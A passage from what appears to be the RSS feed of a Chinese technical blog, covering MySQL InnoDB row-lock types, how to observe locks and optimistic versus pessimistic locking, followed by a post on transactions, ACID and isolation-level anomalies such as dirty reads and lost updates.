&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个时候不仅 order_id = 5 这条记录会加上 X 记录锁，而且这条记录前后的间隙也会加上锁，加锁位置如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1 2 ^ 5 ^ 5 ^ 9
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到 (2, 9) 这个区间都被锁住了，这个时候如果插入 order_id = 4 或者 order_id = 8 这样的记录肯定会被阻塞，这没什么问题，那么现在问题来了，如果插入一条记录 order_id = 2 或者 order_id = 9 会被阻塞吗？答案是可能阻塞，也可能不阻塞，这取决于插入记录主键的值，感兴趣的读者可以参考&lt;a href=&#34;http://blog.sina.com.cn/s/blog_a1e9c7910102vnrj.html&#34;&gt;这篇博客&lt;/a&gt;。&lt;/p&gt;

&lt;h3 id=&#34;插入意向锁-insert-intention-locks&#34;&gt;插入意向锁（Insert Intention Locks）&lt;/h3&gt;

&lt;p&gt;&lt;a href=&#34;https://dev.mysql.com/doc/refman/5.7/en/innodb-locking.html#innodb-insert-intention-locks&#34;&gt;插入意向锁&lt;/a&gt; 是一种特殊的间隙锁（所以有的地方把它简写成 II GAP），这个锁表示插入的意向，只有在 INSERT 的时候才会有这个锁。注意，这个锁虽然也叫意向锁，但是和上面介绍的表级意向锁是两个完全不同的概念，不要搞混淆了。插入意向锁和插入意向锁之间互不冲突，所以可以在同一个间隙中有多个事务同时插入不同索引的记录。譬如在上面的例子中，id = 1 和 id = 5 之间如果有两个事务要同时分别插入 id = 2 和 id = 3 是没问题的，虽然两个事务都会在 id = 1 和 id = 5 之间加上插入意向锁，但是不会冲突。&lt;/p&gt;

&lt;p&gt;插入意向锁只会和间隙锁或 Next-key 锁冲突，正如上面所说，&lt;font color=red&gt;间隙锁唯一的作用就是防止其他事务插入记录造成幻读&lt;/font&gt; ，那么间隙锁是如何防止幻读的呢？&lt;strong&gt;正是由于在执行 INSERT 语句时需要加插入意向锁，而插入意向锁和间隙锁冲突，从而阻止了插入操作的执行&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&#34;行锁的兼容矩阵&#34;&gt;行锁的兼容矩阵&lt;/h3&gt;

&lt;p&gt;下面我们对这四种行锁做一个总结，它们之间的兼容矩阵如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/010.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;其中，&lt;strong&gt;第一行表示已有的锁，第一列表示要加的锁&lt;/strong&gt;。这个矩阵看起来很复杂，因为它是不对称的，如果要死记硬背可能会晕掉。其实仔细看可以发现，不对称的只有插入意向锁，所以我们先对插入意向锁做个总结，如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;font color=red&gt; 插入意向锁不影响其他事务加其他任何锁。也就是说，一个事务已经获取了插入意向锁，对其他事务是没有任何影响的；&lt;/li&gt;
&lt;li&gt;插入意向锁与间隙锁和 Next-key 锁冲突。也就是说，一个事务想要获取插入意向锁，如果有其他事务已经加了间隙锁或 Next-key 锁，则会阻塞。&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;了解插入意向锁的特点之后，我们将它从矩阵中移去，兼容矩阵就变成了下面这个样子：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/07/011.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这个看起来就非常简单了，可以得出下面的结论：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;font color=red&gt;间隙锁不和其他锁（不包括插入意向锁）冲突；&lt;/li&gt;
&lt;li&gt;记录锁和记录锁冲突，Next-key 锁和 Next-key 锁冲突，记录锁和 Next-key 锁冲突；&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;在-mysql-中观察行锁&#34;&gt;在 MySQL 中观察行锁&lt;/h3&gt;

&lt;p&gt;为了更好的理解不同的行锁，下面我们在 MySQL 中对不同的锁实际操作一把。有两种方式可以在 MySQL 中观察行锁，第一种是通过下面的 SQL 语句：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from information_schema.innodb_locks;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个命令会打印出 InnoDb 的所有锁信息，包括锁 ID、事务 ID、以及每个锁的类型和模式等其他信息。第二种是使用下面的 SQL 语句：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; show engine innodb status\G
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个命令并不是专门用来查看锁信息的，而是用于输出当前 InnoDb 引擎的状态信息，包括：BACKGROUND THREAD、SEMAPHORES、TRANSACTIONS、FILE I/O、INSERT BUFFER AND ADAPTIVE HASH INDEX、LOG、BUFFER POOL AND MEMORY、ROW OPERATIONS 等等。其中 TRANSACTIONS 部分会打印当前 MySQL 所有的事务，如果某个事务有加锁，还会显示加锁的详细信息。如果发生死锁，也可以通过这个命令来定位死锁发生的原因。不过在这之前需要先打开 Innodb 的锁监控：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; set global innodb_status_output = ON;
mysql&amp;gt; set global innodb_status_output_locks = ON;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;打开锁监控之后，使用 &lt;code&gt;show engine innodb status&lt;/code&gt; 命令，会输出大量的信息，我们在其中可以找到 &lt;strong&gt;TRANSACTIONS&lt;/strong&gt; 部分，这里面就包含了每个事务及相关锁的信息，如下所示：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;------------
TRANSACTIONS
------------
Trx id counter 3125
Purge done for trx s n:o &amp;lt; 3106 undo n:o &amp;lt; 0 state: running but idle
History list length 17
LIST OF TRANSACTIONS FOR EACH SESSION:
---TRANSACTION 3124, ACTIVE 10 sec
4 lock struct(s), heap size 1136, 3 row lock(s)
MySQL thread id 19, OS thread handle 6384, query id 212 localhost ::1 root
TABLE LOCK table `accounts` trx id 3124 lock mode IX
RECORD LOCKS space id 53 page no 5 n bits 72 index createtime of table `accounts` trx id 3124 lock_mode X
Record lock, heap no 4 PHYSICAL RECORD: n_fields 2; compact format; info bits 0
 0: len 4; hex 5a119f98; asc Z   ;;
 1: len 4; hex 80000005; asc     ;;

RECORD LOCKS space id 53 page no 3 n bits 80 index PRIMARY of table `accounts` trx id 3124 lock_mode X locks rec but not gap
Record lock, heap no 4 PHYSICAL RECORD: n_fields 7; compact format; info bits 0
 0: len 4; hex 80000005; asc     ;;
 1: len 6; hex 000000000c1c; asc       ;;
 2: len 7; hex b70000012b0110; asc     +  ;;
 3: len 4; hex 80000005; asc     ;;
 4: len 4; hex 80000005; asc     ;;
 5: len 0; hex ; asc ;;
 6: len 4; hex 5a119f98; asc Z   ;;

RECORD LOCKS space id 53 page no 5 n bits 72 index createtime of table `accounts` trx id 3124 lock_mode X locks gap before rec
Record lock, heap no 5 PHYSICAL RECORD: n_fields 2; compact format; info bits 0
 0: len 4; hex 5a119fa1; asc Z   ;;
 1: len 4; hex 8000000a; asc     ;;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看出，&lt;code&gt;show engine innodb status&lt;/code&gt; 的输出比较晦涩，要读懂它还需要学习一些其他知识，我们这里暂且不提，后面再专门对其进行介绍。这里使用&lt;code&gt;information_schema.innodb_locks&lt;/code&gt; 表来体验一下 MySQL 中不同的行锁。&lt;/p&gt;

&lt;p&gt;要注意的是，只有在两个事务出现锁竞争时才能在这个表中看到锁信息，譬如你执行一条 UPDATE 语句，它会对某条记录加 X 锁，这个时候 &lt;code&gt;information_schema.innodb_locks&lt;/code&gt; 表里是没有任何记录的。&lt;/p&gt;

&lt;p&gt;另外，只看这个表只能得到当前持有锁的事务，至于是哪个事务被阻塞，可以通过 &lt;code&gt;information_schema.innodb_lock_waits&lt;/code&gt; 表来查看。&lt;/p&gt;

&lt;h4 id=&#34;记录锁&#34;&gt;记录锁&lt;/h4&gt;

&lt;p&gt;根据上面的行锁兼容矩阵，记录锁和记录锁或 Next-key 锁冲突，所以想观察到记录锁，可以让两个事务都对同一条记录加记录锁，或者一个事务加记录锁另一个事务加 Next-key 锁。&lt;/p&gt;

&lt;p&gt;事务 A 执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; select * from accounts where id = 5 for update;
+----+----------+-------+
| id |     name | level |
+----+----------+-------+
|  5 | zhangsan |     7 |
+----+----------+-------+
1 row in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; select * from accounts where id = 5 lock in share mode;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 阻塞，出现锁竞争，查看锁状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from information_schema.innodb_locks;
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
| lock_id     | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
| 3108:53:3:4 | 3108        | S         | RECORD    | `accounts` | PRIMARY    |         53 |         3 |        4 | 5         |
| 3107:53:3:4 | 3107        | X         | RECORD    | `accounts` | PRIMARY    |         53 |         3 |        4 | 5         |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
2 rows in set, 1 warning (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;间隙锁&#34;&gt;间隙锁&lt;/h4&gt;

&lt;p&gt;根据兼容矩阵，间隙锁只和插入意向锁冲突，而且是先加间隙锁，然后加插入意向锁时才会冲突。&lt;/p&gt;

&lt;p&gt;事务 A 执行（id 为主键，且 id = 3 这条记录不存在）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; select * from accounts where id = 3 lock in share mode;
Empty set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; insert into accounts(id, name, level) value(3, &#39;lisi&#39;, 10);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 阻塞，出现锁竞争，查看锁状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from information_schema.innodb_locks;
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
| lock_id     | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
| 3110:53:3:4 | 3110        | X,GAP     | RECORD    | `accounts` | PRIMARY    |         53 |         3 |        4 | 3         |
| 3109:53:3:4 | 3109        | S,GAP     | RECORD    | `accounts` | PRIMARY    |         53 |         3 |        4 | 3         |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+-----------+
2 rows in set, 1 warning (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;next-key-锁&#34;&gt;Next-key 锁&lt;/h4&gt;

&lt;p&gt;根据兼容矩阵，Next-key 锁和记录锁、Next-key 锁或插入意向锁冲突，但是貌似很难制造 Next-key 锁和记录锁冲突的场景，也很难制造 Next-key 锁和 Next-key 锁冲突的场景（如果你能找到这样的例子，还望不吝赐教）。所以还是用 Next-key 锁和插入意向锁冲突的例子，和上面间隙锁的例子几乎一样。&lt;/p&gt;

&lt;p&gt;事务 A 执行（level 为二级索引）：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; select * from accounts where level = 7 lock in share mode;
+----+----------+-------+
| id |     name | level |
+----+----------+-------+
|  5 | zhangsan |     7 |
|  9 |   liusan |     7 |
+----+----------+-------+
2 rows in set (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 执行：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; begin;
mysql&amp;gt; insert into accounts(name, level) value(&#39;lisi&#39;, 7);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;事务 B 阻塞，出现锁竞争，查看锁状态：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;mysql&amp;gt; select * from information_schema.innodb_locks;
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+----------------+
| lock_id     | lock_trx_id | lock_mode | lock_type | lock_table | lock_index | lock_space | lock_page | lock_rec | lock_data      |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+----------------+
| 3114:53:5:5 | 3114        | X,GAP     | RECORD    | `accounts` |      level |         53 |         5 |        5 | 0x5A119FA1, 10 |
| 3113:53:5:5 | 3113        | S,GAP     | RECORD    | `accounts` |      level |         53 |         5 |        5 | 0x5A119FA1, 10 |
+-------------+-------------+-----------+-----------+------------+------------+------------+-----------+----------+----------------+
2 rows in set, 1 warning (0.00 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到除了锁住的索引不同之外，Next-key 锁和间隙锁之间几乎看不出任何差异。&lt;/p&gt;

&lt;h2 id=&#34;乐观锁-vs-悲观锁&#34;&gt;乐观锁 vs. 悲观锁&lt;/h2&gt;

&lt;p&gt;关于 MySQL 下的锁类型到这里就告一段落了。在结束这边博客之前，我认为还有必要介绍下乐观锁和悲观锁的概念，&lt;strong&gt;这两个概念听起来很像是一种特殊的锁，但实际上它并不是什么具体的锁，而是一种锁的思想&lt;/strong&gt;。这种思想无论是在操作数据库时，还是在编程项目中，都非常实用。&lt;/p&gt;

&lt;p&gt;我们知道，不同的隔离级别解决不同的并发问题，MySQL 能够根据设置的隔离级别自动管理事务内的锁，不需要开发人员关心就能避免那些并发问题的发生，譬如在 RC 级别下，开发人员不用担心会出现脏读问题，只要正常的写 SQL 语句就可以了。但对于当前隔离级别无法解决的并发问题，我们就需要自己来处理了，譬如在 MySQL 的 RR 级别下（不是标准的 RR 级别），你肯定会遇到丢失更新问题，对于这种问题，通常有两种解决思路。其实在讲 MVCC 的时候也提到过，解决并发问题的方式除了锁，还可以利用时间戳或者版本号等等手段。前一种处理数据的方式通常叫做 &lt;strong&gt;悲观锁（Pessimistic Lock）&lt;/strong&gt;，第二种无锁方式叫做 &lt;strong&gt;乐观锁（Optimistic Lock）&lt;/strong&gt;。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;悲观锁，顾名思义就是很悲观，每次拿数据时都假设有别人会来修改，所以每次在拿数据的时候都会给数据加上锁，用这种方式来避免跟别人冲突，虽然很有效，但是可能会出现大量的锁冲突，导致性能低下。&lt;/li&gt;
&lt;li&gt;乐观锁则是完全相反，每次去拿数据的时候都认为别人不会修改，所以不会上锁，但是在更新的时候会判断一下在此期间别人有没有改过这个数据，可以使用版本号等机制来判断。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我们在上一篇博客中丢失更新那一节举了一个商品库存的例子，我们分别用悲观锁和乐观锁来解决这个问题，以此来体会两个思想之间的区别以及优缺点。这个例子如下：
譬如商品表的库存字段，每次下单之后库存值需要减 1，大概的流程如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SELECT name, stock FROM product WHERE id = 100;&lt;/li&gt;
&lt;li&gt;判断 stock 值是否足够，如果足够，则下单：if (stock &amp;gt; n) process order;&lt;/li&gt;
&lt;li&gt;更新 stock 值，减去下单的商品数量：new_stock = stock - n;&lt;/li&gt;
&lt;li&gt;UPDATE product SET stock = new_stock WHERE id = 100;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果两个线程同时下单，很可能就会出现下面这样的情况：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;线程 A 获取库存值为 10；&lt;/li&gt;
&lt;li&gt;线程 B 获取库存值为 10；&lt;/li&gt;
&lt;li&gt;线程 A 需要买 5 个商品，校验通过，并下单；&lt;/li&gt;
&lt;li&gt;线程 B 需要买 5 个商品，校验通过，并下单；&lt;/li&gt;
&lt;li&gt;线程 A 下单完成，更新库存值为 10 - 5 = 5；&lt;/li&gt;
&lt;li&gt;线程 B 下单完成，更新库存值为 10 - 5 = 5；&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如果采用悲观锁的思想，我们在线程 A 获取商品库存的时候对该商品记录加 X 锁，并在最后下单完成并更新库存值之后再释放锁，这样线程 B 在获取库存值时就会等待，从而也不会出现线程 B 并发修改库存的情况了。&lt;/p&gt;

&lt;p&gt;如果采用乐观锁的思想，我们不对记录加锁，于是线程 A 获取库存值为 10，线程 B 获取库存也为 10，然后线程 A 更新库存为 5 的时候使用类似于这样的 SQL 来校验当前库存值是否被修改过：&lt;code&gt;UPDATE product SET stock = new_stock WHERE id = 100 AND stock = 10;&lt;/code&gt; 如果 UPDATE 成功则认为没有修改过，下单成功；同样线程 B 更新库存为 5 的时候也用同样的方式校验，很显然校验失败，这个时候我们可以重新查询最新的库存值并下单，或者直接抛出异常提示下单失败。这种带条件的更新就是乐观锁。但是要注意的是，这种带条件的更新还可能会遇到 &lt;a href=&#34;https://en.wikipedia.org/wiki/ABA_problem&#34;&gt;ABA 问题&lt;/a&gt;（关于 ABA 问题可以参考 &lt;a href=&#34;https://en.wikipedia.org/wiki/Compare-and-swap&#34;&gt;CAS&lt;/a&gt;），解决方法则是为每一条记录增加一个唯一的版本号字段，使用版本号字段来进行判断。再举一个很现实的例子，我们通常使用 svn 更新和提交代码，也是使用了乐观锁的思想，当用户提交代码时，会根据你提交的版本号和代码仓库中最新的版本号进行比较，如果一致则允许提交，如果不一致，则提示用户更新代码到最新版本。&lt;/p&gt;

&lt;p&gt;总的来说，&lt;strong&gt;悲观锁需要使用数据库的锁机制来实现，而乐观锁是通过程序的手段来实现&lt;/strong&gt;，这两种锁各有优缺点，不可认为一种好于另一种，像乐观锁适用于读多写少的情况下，即冲突真的很少发生，这样可以省去锁的开销，加大系统的吞吐量。但如果经常产生冲突，上层应用不断的进行重试，这样反倒是降低了性能，所以这种情况下用悲观锁更合适。虽然使用带版本检查的乐观锁能够同时保持高并发和高可伸缩性，但它也不是万能的，譬如它不能解决脏读问题，所以在实际应用中还是会和数据库的隔离级别一起使用。&lt;/p&gt;

&lt;p&gt;不仅仅是数据库，其实在分布式系统中，我们也可以看到悲观锁和乐观锁的影子。譬如酷壳上的这篇文章《&lt;a href=&#34;https://coolshell.cn/articles/6790.html&#34;&gt;多版本并发控制(MVCC)在分布式系统中的应用&lt;/a&gt;》中提到的案例，就是一个典型的提交覆盖问题，可以通过悲观锁或者乐观锁来解决。&lt;/p&gt;

&lt;p&gt;转载自：&lt;a href=&#34;https://www.aneasystone.com/archives/2017/11/solving-dead-locks-two.html&#34;&gt;aneasystone&amp;rsquo;s blog&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>死锁 - 了解事务与隔离级别</title>
      <link>https://wangzitao6.github.io/2018-07-25-%E4%BA%86%E8%A7%A3%E4%BA%8B%E5%8A%A1%E4%B8%8E%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB</link>
      <pubDate>Wed, 25 Jul 2018 15:36:47 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-07-25-%E4%BA%86%E8%A7%A3%E4%BA%8B%E5%8A%A1%E4%B8%8E%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB</guid>
      <description>

&lt;p&gt;这个月线上环境突然经常报警，排查后发现了下面这样的异常，一天出现三四次的样子。看异常信息就知道是发生了数据库死锁，由于这块对业务影响不是很大，自己以前也没接触过,决定花点时间,从网上找查找资料,将 MySQL 数据库的一些基础知识，包括事务、隔离级别、索引和锁等重新看一遍，也顺利解决了线上的死锁问题。&lt;/p&gt;

&lt;p&gt;异常信息如下：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;### Error updating database.  Cause:     com.mysql.jdbc.exceptions.jdbc4.MySQLTransactionRollbackException:
Deadlock found when trying to get lock; try restarting transaction&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;根据日志,知道是发生了死锁,由于死锁发生的场景比较多,再加上自己刚接手这个模块,准备一边了解业务场景,一边学习死锁知识.
1. 了解事务与隔离级别
2. 了解常见锁类型
3. 掌握常见 SQL 语句的加锁分析
4. 死锁问题的分析和解决&lt;/p&gt;

&lt;p&gt;说起死锁，则不得不说事务，当两个或两个以上的事务相互持有和请求锁的时候，如果形成一个循环的依赖关系，就会产生死锁。所以我们先了解事务.&lt;/p&gt;

&lt;h2 id=&#34;事务四要素-acid&#34;&gt;事务四要素：ACID&lt;/h2&gt;

&lt;p&gt;对于事务，我之前的理解是很粗糙的，不就是为了保证操作的原子性么？一般订单系统或者财务系统跟钱打交道的都会用到对吧？事务可以保证所有的操作一次性提交，要么全部成功，要么全部失败，譬如 A 转账给 B 100 元，先从 A 的账户里扣除 100 元，再在 B 的账户上加上 100 元，这两个操作必须同时成功，如果 A 的钱减了之后程序异常了，事务会将 A 的钱回滚回去，就是这么简单啊。&lt;/p&gt;

&lt;p&gt;确实如此，原子性可以说是事务四要素中最直白的一个，也是最容易理解的一个。但是我们往往忽略了事务的另外三个要素：一致性、隔离性和持久性。这四个要素合起来就是 ACID 。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;原子性（Atomicity）：要么全部完成，要么全部不完成；&lt;/li&gt;
&lt;li&gt;一致性（Consistency）：一个事务单元需要提交之后才会被其他事务可见；&lt;/li&gt;
&lt;li&gt;隔离性（Isolation）：并发事务之间不会互相影响，设立了不同程度的隔离级别，通过适度的破坏一致性，得以提高性能；&lt;/li&gt;
&lt;li&gt;持久性（Durability）：事务提交后即持久化到磁盘不会丢失。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;对于死锁，我们还是应该把注意力放在 &lt;strong&gt;隔离性（Isolation）&lt;/strong&gt; 上面，因为不同的隔离级别，可能对应的加锁过程也不一样，而正是由于引入了各种各样的隔离级别，才让锁问题变得格外复杂。解决和分析死锁问题，首先得知道当前数据库的隔离级别。那么隔离级别是个什么东西呢？其实从上面也看的出来，隔离性和一致性是有冲突的，有时候为了提高性能，会适度的破坏一致性，可能会出现一个事务还没提交，它的修改就被其他事务看见了，这其实就是传说中的 &lt;strong&gt;脏读&lt;/strong&gt;，它属于最低级的隔离级别 &lt;strong&gt;读未提交&lt;/strong&gt;&lt;/p&gt;

&lt;h2 id=&#34;事务并发存在的问题&#34;&gt;事务并发存在的问题&lt;/h2&gt;

&lt;p&gt;在细讲事务的隔离级别之前，让我们先来看一下下面这张表，以及几个对这个表的操作，瞧瞧在多事务并发处理数据的时候可能会发生哪些意想不到的情况。&lt;/p&gt;

&lt;p&gt;表很简单，就三个字段，主键 id、姓名 name 和余额 balance，其中 name 为二级索引，如下：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;脏读-dirty-read&#34;&gt;脏读（dirty read）&lt;/h3&gt;

&lt;p&gt;假设有两个事务，一个在进行转账操作，将 A 账户的 100 元转到 B 账户，同时有另一个事务在对 A 和 B 的账户余额进行求和统计，如下图所示：&lt;/p&gt;

&lt;p&gt;我们不考虑任何加锁机制，仅仅从程序运行的角度来看，事务 1 执行成功之后，A 成功转了 100 元到 B 账户，这时 A 余额还剩 900 元，B 余额剩 1100，总和为 2000；但是事务 2 的统计求和算出来的结果却是 A + B = 1900。这个就是上面说的，没有提交的事务被其他事务读取到了，这叫做 &lt;strong&gt;脏读&lt;/strong&gt; 。
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;解决办法：
把数据库的事务隔离级别调整到 &lt;strong&gt;读未提交&lt;/strong&gt; 以上，可以解决脏读。&lt;/p&gt;

&lt;h3 id=&#34;不可重复读-unrepeatable-read&#34;&gt;不可重复读（unrepeatable read）&lt;/h3&gt;

&lt;p&gt;第二种场景叫 不可重复读，如下图所示，事务 2 第一次获取 A 的账户余额为 1000 元，这个时候事务 1 对 A 的账户余额进行操作减去了 100 元，事务 2 再去查询 A 的账户余额发现变成了 900 元，这样就出现了同一个事务对同一条记录读取两遍，两次读出来的结果竟然不一样。&lt;/p&gt;

&lt;p&gt;不可重复读和脏读的区别在于，&lt;strong&gt;脏读是读取了另一个事务未提交的修改，而不可重复读是读取了另一个事务提交之后的修改&lt;/strong&gt;，本质上都是其他事务的修改影响了本事务的读取。那么不可重复读有什么问题呢？假设上面的事务 2 存在着两个子例程，第一个例程是读取所有账户的余额计算总和，可以得到所有人的余额总和为 3000，第二个例程是再次读取所有账户的余额计算平均值，3 个人总和 3000 按理应该是平均每人 1000 才对，却计算出了 &lt;sup&gt;2900&lt;/sup&gt;&amp;frasl;&lt;sub&gt;3&lt;/sub&gt; = 966，这就导致了数据不一致。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;解决办法：
通过在读的时候加锁，可以解决不可重复读。&lt;/p&gt;

&lt;h3 id=&#34;幻读-phantom-read&#34;&gt;幻读（phantom read）&lt;/h3&gt;

&lt;p&gt;幻读就是在一个事务中一次查询之后,有另一个事务进行了插入或删除操作,插入或删除的内容是满足上述查询条件的,如果这个事务中海油同样查询条件的二次查询,会导致第二次查询的结果与第一次不一致.&lt;/p&gt;

&lt;p&gt;比如:管理员A查询id大于等于2的数据发现有2,3两条，但是另外一个线程就在这个时候插入（注意是插入或者删除，不是修改））了一条新的id=4的记录，当管理员A再次查询时,发现多了一条记录，就好像发生了幻觉一样。这就叫幻读。&lt;/br&gt;
解决办法：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;解决办法：
通过串行化，可以解决幻读。&lt;/p&gt;

&lt;h3 id=&#34;丢失更新-lost-update&#34;&gt;丢失更新（lost update）&lt;/h3&gt;

&lt;p&gt;上面说的三种情况，都是一个事务写，一个事务读，由于一个事务的写导致另一个事务读到了不该读的数据；那么如果两个事务都是写，又会发生什么呢？&lt;/p&gt;

&lt;p&gt;假设两个事务同时对 A 的余额进行修改，他们都查出 A 的当前余额为 1000，然后事务 2 修改 A 的余额，将 A 的余额加 100 变成 1100 并提交，这个时候 A 的余额应该是 1100，但是这个时候事务 1 并不知道 A 的余额已经变动，而是继续在 1000 的基础上进行减 100 的操作并提交事务，就这样事务 2 的提交被覆盖掉了，事务 1 提交之后 A 的余额变成了 900 元。这就是说事务 1 的提交覆盖了事务 2 的提交，事务 2 的 UPDATE 操作完全丢失了，整个过程如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/5.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这就是经典的 &lt;strong&gt;丢失更新&lt;/strong&gt; 问题，由于最后一步是提交操作，所以又叫做 &lt;strong&gt;提交覆盖&lt;/strong&gt;，有时候又叫 Read-Modify-Write 问题。一个典型的场景是并发对某个变量进行自增或自减，譬如商品表的库存字段，每次下单之后库存值需要减 1，大概的流程如下：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;SELECT name, stock FROM product WHERE id = 100;&lt;/li&gt;
&lt;li&gt;判断 stock 值是否足够，如果足够，则下单：if (stock &amp;gt; n) process order;&lt;/li&gt;
&lt;li&gt;更新 stock 值，减去下单的商品数量：new_stock = stock - n;&lt;/li&gt;
&lt;li&gt;UPDATE product SET stock = new_stock WHERE id = 100;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;如果两个线程同时下单，很可能就会出现下面这样的情况：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;线程 A 获取库存值为 10；&lt;/li&gt;
&lt;li&gt;线程 B 获取库存值为 10；&lt;/li&gt;
&lt;li&gt;线程 A 需要买 5 个商品，校验通过，并下单；&lt;/li&gt;
&lt;li&gt;线程 B 需要买 5 个商品，校验通过，并下单；&lt;/li&gt;
&lt;li&gt;线程 A 下单完成，更新库存值为 10 - 5 = 5；&lt;/li&gt;
&lt;li&gt;线程 B 下单完成，更新库存值为 10 - 5 = 5；&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;两个线程下单结束后，商品的库存还剩 5 个，而实际上 10 个商品都已经卖光了。和提交覆盖相对的，还有另一个 &lt;strong&gt;丢失更新&lt;/strong&gt; 问题，叫做 &lt;strong&gt;回滚覆盖&lt;/strong&gt;，如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/06/6.png&#34; alt=&#34;&#34; /&gt;
操作和提交覆盖情景基本上一样，只是最后一步事务 1 的提交变成了回滚，这样 A 的余额恢复成原始值 1000，事务 2 的 UPDATE 操作也完全没有生效，想一想这真的是非常可怕，一个事务的回滚操作竟然影响了另一个正常提交的事务。回滚覆盖问题可以说是程序 bug 了，因此几乎所有的数据库都不允许回滚覆盖。&lt;/p&gt;

